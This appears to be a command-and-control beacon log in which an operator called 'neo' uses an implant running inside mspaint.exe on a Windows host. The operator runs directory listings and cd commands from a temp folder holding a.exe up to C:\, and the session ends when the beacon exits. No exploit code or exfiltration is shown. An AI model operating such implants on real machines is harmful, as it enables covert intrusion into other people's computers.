12/16 05:54:04 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: ACER; user: david; process: mspaint.exe; pid: 22812; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
12/16 05:55:43 UTC [input] <neo> ls
12/16 05:55:43 UTC [task] <> Tasked beacon to list files in .
12/16 05:55:49 UTC [input] <neo> pwd
12/16 05:55:49 UTC [task] <> Tasked beacon to print working directory
12/16 05:56:04 UTC [checkin] host called home, sent: 27 bytes
12/16 05:56:04 UTC [output]
C:\Users\david\AppData\Local\Temp\RarSFX10\*
D	0	12/16/2022 12:53:03	.
D	0	12/16/2022 12:56:01	..
F	927232	12/16/2022 12:51:23	a.exe
F	2247	12/15/2022 15:25:31	Google Chrome.lnk


12/16 05:56:04 UTC [output]
Current directory is C:\Users\david\AppData\Local\Temp\RarSFX10

12/16 05:57:48 UTC [input] <neo> cd ../../../..
12/16 05:57:48 UTC [task] <> cd ../../../..
12/16 05:58:04 UTC [checkin] host called home, sent: 19 bytes
12/16 06:00:32 UTC [input] <neo> pwd
12/16 06:00:32 UTC [task] <> Tasked beacon to print working directory
12/16 06:01:04 UTC [checkin] host called home, sent: 8 bytes
12/16 06:01:04 UTC [output]
Current directory is C:\Users\david

12/16 06:01:48 UTC [input] <neo> cd ../..
12/16 06:01:48 UTC [task] <> cd ../..
12/16 06:02:04 UTC [checkin] host called home, sent: 13 bytes
12/16 06:04:40 UTC [input] <neo> pwd
12/16 06:04:40 UTC [task] <> Tasked beacon to print working directory
12/16 06:05:04 UTC [checkin] host called home, sent: 8 bytes
12/16 06:05:04 UTC [output]
Current directory is C:\

12/16 06:05:07 UTC [input] <neo> ls
12/16 06:05:07 UTC [task] <> Tasked beacon to list files in .
12/16 06:06:04 UTC [checkin] host called home, sent: 19 bytes
12/16 06:06:04 UTC [output]
C:\\*
D	0	10/15/2022 12:34:17	$Recycle.Bin
D	0	10/21/2022 14:29:52	$WINDOWS.~BT
D	0	12/05/2022 10:08:57	$Windows.~WS
D	0	12/14/2022 12:03:10	$WinREAgent
F	0	09/21/2022 11:56:17	$WINRE_BACKUP_PARTITION.MARKER
F	112104	10/19/2022 19:52:30	appverifUI.dll
D	0	09/14/2022 22:21:08	Autodesk
F	112	08/26/2022 20:41:26	bootTel.dat
D	0	08/26/2022 06:37:12	Documents and Settings
F	12288	12/16/2022 07:15:39	DumpStack.log.tmp
F	35	09/21/2022 15:30:19	END
F	6772670464	12/16/2022 08:05:02	hiberfil.sys
D	0	12/16/2022 07:15:46	Intel
D	0	08/26/2022 06:44:32	OneDriveTemp
F	5637144576	12/16/2022 12:37:41	pagefile.sys
D	0	05/07/2022 12:24:50	PerfLogs
D	0	12/09/2022 19:53:23	Program Files
D	0	12/09/2022 19:53:23	Program Files (x86)
D	0	12/13/2022 15:16:51	ProgramData
D	0	11/27/2022 17:53:55	Recovery
D	0	11/15/2022 13:55:09	SQL2019
F	16777216	12/16/2022 07:15:39	swapfile.sys
D	0	12/15/2022 22:52:31	System Volume Information
D	0	10/15/2022 12:35:02	Users
F	66176	10/19/2022 19:52:20	vfcompat.dll
D	0	12/14/2022 12:46:56	Windows


12/16 06:10:51 UTC [input] <neo> cd ProgramFiles
12/16 06:10:51 UTC [task] <> cd ProgramFiles
12/16 06:11:04 UTC [checkin] host called home, sent: 20 bytes
12/16 06:12:48 UTC [input] <neo> ls
12/16 06:12:48 UTC [task] <> Tasked beacon to list files in .
12/16 06:13:04 UTC [checkin] host called home, sent: 19 bytes
12/16 06:13:04 UTC [output]
C:\\*
D	0	10/15/2022 12:34:17	$Recycle.Bin
D	0	10/21/2022 14:29:52	$WINDOWS.~BT
D	0	12/05/2022 10:08:57	$Windows.~WS
D	0	12/14/2022 12:03:10	$WinREAgent
F	0	09/21/2022 11:56:17	$WINRE_BACKUP_PARTITION.MARKER
F	112104	10/19/2022 19:52:30	appverifUI.dll
D	0	09/14/2022 22:21:08	Autodesk
F	112	08/26/2022 20:41:26	bootTel.dat
D	0	08/26/2022 06:37:12	Documents and Settings
F	12288	12/16/2022 07:15:39	DumpStack.log.tmp
F	35	09/21/2022 15:30:19	END
F	6772670464	12/16/2022 08:05:02	hiberfil.sys
D	0	12/16/2022 07:15:46	Intel
D	0	08/26/2022 06:44:32	OneDriveTemp
F	5637144576	12/16/2022 12:37:41	pagefile.sys
D	0	05/07/2022 12:24:50	PerfLogs
D	0	12/09/2022 19:53:23	Program Files
D	0	12/09/2022 19:53:23	Program Files (x86)
D	0	12/13/2022 15:16:51	ProgramData
D	0	11/27/2022 17:53:55	Recovery
D	0	11/15/2022 13:55:09	SQL2019
F	16777216	12/16/2022 07:15:39	swapfile.sys
D	0	12/15/2022 22:52:31	System Volume Information
D	0	10/15/2022 12:35:02	Users
F	66176	10/19/2022 19:52:20	vfcompat.dll
D	0	12/14/2022 12:46:56	Windows


12/16 06:21:40 UTC [input] <neo> cd Program\ Files
12/16 06:21:40 UTC [task] <> cd Program\ Files
12/16 06:22:04 UTC [checkin] host called home, sent: 30 bytes
12/16 06:22:04 UTC [output]
beacon exit.

12/16 06:22:42 UTC [input] <neo> exit
12/16 06:22:42 UTC [task] <> Tasked beacon to exit
